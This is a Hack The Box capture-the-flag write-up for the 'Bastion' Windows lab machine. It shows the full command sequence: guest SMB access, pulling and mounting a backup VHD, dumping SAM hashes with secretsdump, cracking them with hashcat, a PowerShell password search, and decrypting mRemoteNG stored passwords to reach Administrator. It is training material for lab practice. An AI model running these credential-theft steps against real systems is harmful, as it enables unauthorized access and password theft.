# Target
[Bastion](https://app.hackthebox.com/machines/Bastion/information) is an Easy level Wi  ndows box which contains a VHD ( Virtual Hard Disk ) image from which credentials can be extracted. After logging in, the software MRemoteNG is found to be installed which stores passwords insecurely, and from which credentials can be extracted. 

# Scan
```
nmap -sS -sC $TARGET_IP
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-21 08:43 CET
Nmap scan report for 10.129.82.228
Host is up (0.028s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  wsman

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-01-21T07:43:44
|_  start_date: 2025-01-21T07:42:46
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-01-21T08:43:46+01:00
|_clock-skew: mean: -19m58s, deviation: 34m36s, median: 0s

Nmap done: 1 IP address (1 host up) scanned in 16.33 seconds
```

# Foothold
Initial scan shows that we have guest access to SMB server. Let's start with it's enumeration.

```
smbmap -u guest -p '' -H $TARGET_IP
```
```
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
[!] Unable to remove test file at \\10.129.82.228\Backups\JPYCTSINQL.txt, please remove manually                            
                                                                                                                             
[+] IP: 10.129.82.228:445      Name: 10.129.82.228              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Backups                                                 READ, WRITE
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
[*] Closed 1 connections         
```

We can see that we have read access to `Backup` share. Further enumeration, by simply browsing files, shows that it contains `.vhd` (Virtual Hard Disk) files, which are used by Windows Server Backup to create (you guessed it) backups of whole volumes.
```
smbclient -U guest% \\\\$TARGET_IP\\Backups --option="client min protocol=SMB2" -c 'ls "WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\"'
```
```
  .                                  Dn        0  Fri Feb 22 13:45:32 2019
  ..                                 Dn        0  Fri Feb 22 13:45:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 13:44:03 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 13:45:32 2019
  BackupSpecs.xml                    An     1186  Fri Feb 22 13:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml     An     1078  Fri Feb 22 13:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml     An     8930  Fri Feb 22 13:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml     An     6542  Fri Feb 22 13:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml     An     2894  Fri Feb 22 13:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml     An     1488  Fri Feb 22 13:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml     An     1484  Fri Feb 22 13:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml     An     3844  Fri Feb 22 13:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml     An     3988  Fri Feb 22 13:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml     An     7110  Fri Feb 22 13:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml     An  2374620  Fri Feb 22 13:45:32 2019
```

Let's exfiltrate whole share to dig deeper locally. As this share contains a lot of data this process might take couple of minutes.
```
smbclient -U guest% \\\\$TARGET_IP\\Backups --option="client min protocol=SMB2" -c "recurse ON; prompt OFF; mget *"
```

Having `.vhd` file locally we could mount it on our attack machine.
```
sudo mkdir /mnt/bastion && \
sudo guestmount -a "./WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" -i --ro /mnt/bastion
```

After mounting backup volume we can start browsing it's content. As we have full unrestriced access to all files we could try to loot NTLM hashes stored in SAM file (sudo needed to access mounted volume).
```
sudo impacket-secretsdump -sam /mnt/bastion/Windows/System32/config/SAM -system /mnt/bastion/Windows/System32/config/SYSTEM LOCAL -outputfile bastion
```
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Cleaning up... 
```

Let's use `hashcat` to perform dictionary attack against those NTLM hashes.
```
hashcat -m 1000 -a 0 bastion.sam /usr/share/wordlists/rockyou.txt --quiet
```
```
31d6cfe0d16ae931b73c59d7e0c089c0:
26112010952d963c8dc4217daec986d9:************
```

We were able to brake hashes for `Guest` (empty password) and `L4mpje` users. Our `nmap` scan showed that target is running SSH server, let's try to login using discovered credentials.
```
ssh L4mpje@$TARGET_IP
L4mpje@10.129.82.228's password:

Microsoft Windows [Version 10.0.14393]                                                                                          
(c) 2016 Microsoft Corporation. All rights reserved.                                                                            

l4mpje@BASTION C:\Users\L4mpje>
```

We have our foothold! Let's grab user flag and proceed to elevation of privileges.
```
l4mpje@BASTION C:\Users\L4mpje>type C:\Users\L4mpje\Desktop\user.txt                                                            
********************************
```

# Privileges escalation
Let's start with basic enumeration
```
l4mpje@BASTION C:\Users\L4mpje>whoami /all                                                                                      
```
```
USER INFORMATION                                                                                                                
----------------                                                                                                                

User Name      SID                                                                                                              
============== ==============================================                                                                   
bastion\l4mpje S-1-5-21-2146344083-2443430429-1430880910-1002                                                                   


GROUP INFORMATION                                                                                                               
-----------------                                                                                                               

Group Name                             Type             SID          Attributes                                                 
====================================== ================ ============ ==================================================         
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group         
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group         
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group         
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group         
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group         
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group         
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group         
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                             


PRIVILEGES INFORMATION                                                                                                          
----------------------                                                                                                          

Privilege Name                Description                    State                                                              
============================= ============================== =======                                                            
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                            
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled 
```

Nothing fancy on user priviliges.

```
l4mpje@BASTION C:\Users\L4mpje>systeminfo
ERROR: Access denied

l4mpje@BASTION C:\Users\L4mpje>wmic os get
ERROR:
Description = Access denied

l4mpje@BASTION C:\Users\L4mpje>tasklist
ERROR: Access denied
```

Access to basic commands is blocked, additionally Windows Defender does not allow us to execute msfvenom payloads (also encoded) and thus forbids us form quickly running msf exploit suggester. Instead of trying AV / EDR evasion let's check if Powershell is available and try our luck with it.
```
l4mpje@BASTION C:\Users\L4mpje>powershell                                                     
Windows PowerShell                                                            
Copyright (C) 2016 Microsoft Corporation. All rights reserved.               

PS C:\Users\L4mpje>
```

Let's try recursive file search and look for "password" across whole target. This might generate a lot of false / positives, so to make spotting a little bit easier I've came with following recursive grep with 'pattern highlighting' functionality. Those functions might get handy on future attacks.

```
function Write-Host-Highlighted {
    param(
        [Parameter(Mandatory)]
        [string]$Text,
        [Parameter(Mandatory)]
        [string]$Highlight,
        [string]$ForegroundColorMatch = "Red",
        [string]$BackgroundColorMatch = "Yellow"
    )

    $Parts = $Text -split $Highlight
    for ($i = 0; $i -lt $Parts.Length; $i++) {
        if ($i -eq $Parts.Length - 1) {
            Write-Host $Parts[$i] -NoNewline
        } else {
            Write-Host $Parts[$i] -NoNewline
            Write-Host $Highlight -NoNewline -ForegroundColor $ForegroundColorMatch -BackgroundColor $BackgroundColorMatch
        }
    }
}

function Recursive-Grep {
    param(
        [Parameter(Mandatory)]
        [string]$Filter,
        [Parameter(Mandatory)]
        [string]$Pattern
    )

    Get-ChildItem -Recurse -File -Force -ErrorAction SilentlyContinue -Filter $Filter | Select-String -Pattern $Pattern -ErrorAction SilentlyContinue | ForEach-Object {
        Write-Host "$($_.Path):$($_.LineNumber):" -NoNewline -ForegroundColor "Blue"
        Write-Host-Highlighted -Text $_.Line -Highlight "password"
        Write-Host ""
    }
}
```

Let's search across whole target
```
PS C:\Users\L4mpje> cd \ 
PS C:\> Recursive-Grep -Filter "*.xml" -Pattern "password"
```

There is a lot of results, but thanks to said highlighting, interesting things are easier to spot f.e.
```
C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml:3: <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" Hostname="127.0.0.1" Protocol="RDP"

<SNIP>

C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml:4:    <Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="8d3579b2-e68e-48c1-8f0f-9ee1347c9128" Username="L4mpje" Domain="" password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB" Hostname="192.168.1.75" Protocol="RDP"

<SNIP>
```

It seems that we have found configuration files for `mRemoteNG` which contains Base64 encoded passwords for `Administrator` and `L4mpje` users, quick [google search](https://www.errno.fr/mRemoteNG) show thats we could actually decrypt those passwords. There is even a [script](https://github.com/gquere/mRemoteNG_password_decrypt) that could be used for that. Let's exfiltrate this configuration run this script against it.

```
git clone https://github.com/gquere/mRemoteNG_password_decrypt.git && \
cd mRemoteNG_password_decrypt && \
scp l4mpje@$TARGET_IP:~/AppData/Roaming/mRemoteNG/confCons.xml . && \
./mremoteng_decrypt.py confCons.xml
```
```
Cloning into 'mRemoteNG_password_decrypt'...
remote: Enumerating objects: 11, done.
remote: Counting objects: 100% (11/11), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 11 (delta 2), reused 10 (delta 2), pack-reused 0 (from 0)
Receiving objects: 100% (11/11), done.
Resolving deltas: 100% (2/2), done.
l4mpje@10.129.82.228's password: 
confCons.xml                                                                                                                                                      100% 6316    85.1KB/s   00:00    
Name: DC
Hostname: 127.0.0.1
Username: Administrator
Password: ****************

Name: L4mpje-PC
Hostname: 192.168.1.75
Username: L4mpje
Password: ************
```

Both passwords decrypted! Let's check if we could use `Administrator` credentials to gain access over SSH

```
ssh Administrator@$TARGET_IP
Administrator@10.129.82.228's password:

Microsoft Windows [Version 10.0.14393]                                                                                          
(c) 2016 Microsoft Corporation. All rights reserved.                                                                            

administrator@BASTION C:\Users\Administrator>
```

We have sucessfully elevated priviliges to `Administrator`! Let's grab the flag and we're done.
```
administrator@BASTION C:\Users\Administrator>type C:\Users\Administrator\Desktop\root.txt                                       
********************************
```